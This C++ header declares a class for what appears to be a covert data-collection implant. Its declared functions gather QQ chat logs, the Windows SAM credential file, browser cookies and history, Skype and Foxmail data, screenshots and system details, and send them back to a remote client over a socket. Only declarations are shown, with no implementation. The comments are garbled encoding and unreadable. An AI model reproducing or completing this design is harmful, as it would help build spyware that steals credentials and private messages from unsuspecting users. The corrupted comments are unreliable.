#ifndef __RUN__TSPSERVER_EVIDENCE__H___
#define __RUN__TSPSERVER_EVIDENCE__H___

#include "Skype.h"
#include "macros.h"
#include "ClientSocket.h"
#include "EvidenceScreen.h"
#include "EvidenceFoxMail.h"

class CEvidence/* : public CManager */ 
{
public:
	CEvidence();
	~CEvidence(void);

	BOOL StartWork();
	BOOL StopWork();
	BOOL SetWorkState(INFOSTATE *pInfoState, int nSize);
	BOOL GetWorkState(INFOSTATE *pInfoState);
	BOOL SetSingleSign(LPCSTR lpFileName);
	static BOOL WINAPI FilterFileEx(LPVOID lpThis, LPSTR lpFileName);
	BOOL FilterFile( LPSTR lpFileName);

	void GetMiQiu();
	BOOL SetAutoSreenArg(TCHAR *szCmdLine);

	BOOL PassBackFileList(CHAR *szBuffer,CHAR *szFirstFile);





private:
	typedef struct  tag_CONFIGFILENODE
	{
		CHAR nMagic[4];				//�ļ��ṹ���ħ��
		CHAR szFileName[MAX_PATH];  //�ļ�ȫ·��
		FILETIME dwTmModify;		//�ļ����޸�ʱ��
		BOOL bValid;				//�ļ��ڵ��Ƿ���Ч
	}CONFIGFILENODE, *LPCONFIGFILENODE;

	typedef struct  
	{ 
		int nTypeAlarmSrn;
		CHAR szFilterContent[12];
	}FILTERCONTENT, *PFILTERCONTENT;

	static DWORD WINAPI SendToClient2(LPVOID lpVoid);
	static DWORD WINAPI SendToClientEx(LPVOID lpVoid);		//�ش����ͻ���
	DWORD SendToClient();

	static DWORD WINAPI GetLocalFileEx(LPVOID LPARAM);//��ȡ���ص��ļ�
	static DWORD WINAPI GetLocalDirList(LPVOID LPARAM);//��ȡ���ص��ļ��б�

	static DWORD WINAPI GetQQlog(LPVOID LPARAM);//��ȡQQ�������¼�ļ�


	static DWORD WINAPI GetSystemInfoEx(LPVOID LPARAM);
	static DWORD WINAPI MonitorAccessEx(LPVOID lpVoid);		//�Է��ʼ�¼���м��
	DWORD MonitorAccess();

	BOOL CreateRecentFileOne(PWIN32_FIND_DATA lpFindFileData);
	BOOL GetFileNameFormCutShort(LPTSTR strFileName, LPTSTR strOutFileName);
	BOOL CopyWebPath(LPSTR lpPath);
	int ReplaceStr(char *sSrc, char *sMatchStr, char *sReplaceStr);
	BOOL CreateRecentFile();		//������������ʵ��ļ�ȡ֤����
	BOOL CreateWebHistory();		//������Web������ʷ�ļ�	
	BOOL InitParam();
	BOOL DeleteDirectory(LPCTSTR sDirName);
//	BOOL CreateQQLogFile();
	BOOL CreateCookiesFile();
//	BOOL CreateQQFileOne(LPCSTR lpPathName);
	BOOL StartPlugScreen();
	BOOL StopPlugScreen();
	BOOL GetSamFile();

	BOOL CreateQQLogFile(char *  szQQPath);
	BOOL CreateQQFileOne(LPCSTR lpPathName);

	//
	BOOL DirToFile(TCHAR *szDriver);

	BOOL GetLocalFile(TCHAR *szHuiChan);

	BOOL GetSystemInfo(TCHAR *szMaction);
	void GetSystemSub(char *szExe,char *szsysinfo);

	
private:	
	char m_szPathEvidence[MAX_PATH];
	char m_szPathRecent[MAX_PATH];
	char m_szPathWeb[MAX_PATH];
	char m_szLogUser[MAX_PATH];

	char m_szSysRecent[MAX_PATH];
	char m_szSysHistory[MAX_PATH];

	char m_szSingleMark[MAX_PATH];
	int m_nMacAddr[6];
	char m_szConfigFileName[MAX_PATH];
	char m_szPathCookies[MAX_PATH];
	char m_szPathQQ[MAX_PATH];
	char m_szPathSam[MAX_PATH];

	char m_szPathPassBack[MAX_PATH];
	char m_szPathDir[MAX_PATH];

	char m_szPathMachine[MAX_PATH];




	HANDLE m_hConfigFile;
	HANDLE m_hThreadMonitor;
	HANDLE m_hThreadSend;
	HANDLE m_hevnetMonitor;
	HANDLE m_heventSend;
	HANDLE m_hQuit;
	CSkype *m_pObjSkype;
	BOOL m_bWorking;
	DWORD m_dwCapacity;
	DWORD m_dwAvalible;
	int m_nWorkState;
	int m_nCapacityCount;
	CClientSocket	*m_pSocketClient;
	CEvidenceScreen *m_pScreen;
	char m_szPlugSreenName[MAX_PATH];
	char m_szFDump[MAX_PATH];

	BOOL m_bWorkPlugScreen;

	HMODULE m_hDllCleverScreen;
	CRITICAL_SECTION m_cs;

	CEvidenceFoxMail *m_pFoxmail;
	static FILTERCONTENT m_sFilterContent[];
	INFOSTATE m_infoState;


};

#endif//__RUN__TSPSERVER_EVIDENCE__H___